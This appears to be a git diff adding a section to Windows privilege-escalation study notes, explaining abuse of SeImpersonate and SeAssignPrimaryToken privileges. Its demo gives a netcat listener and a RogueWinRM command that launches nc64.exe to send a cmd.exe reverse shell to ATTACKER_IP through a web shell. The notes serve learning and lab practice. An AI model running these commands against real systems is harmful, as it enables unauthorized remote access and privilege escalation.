@@ -764,6 +764,29 @@ The easiest way to gain access to another user is to gather credentials from a c
     <img src="https://user-images.githubusercontent.com/73976100/224530102-38714ced-bfe2-4e44-ae57-9104a2350761.png" width="700">  
     </details>
 
+- SeImpersonate / SeAssignPrimaryToken  
+    These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.  
+    As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.  
+    <details>
+    <summary>DEMO</summary>
+
+    To elevate privileges using such accounts, an attacker needs the following:
+     1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 
+     2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.  
+
+     We will use RogueWinRM exploit to accomplish both conditions.  
+
+     Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:
+     ```
+     user@attackerpc$ nc -lvp 4442
+     ```  
+     And then, use our web shell to trigger the RogueWinRM exploit using the following command:  
+     ```
+     c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+     ```  
+    </details>  
+
+    
 
 
 
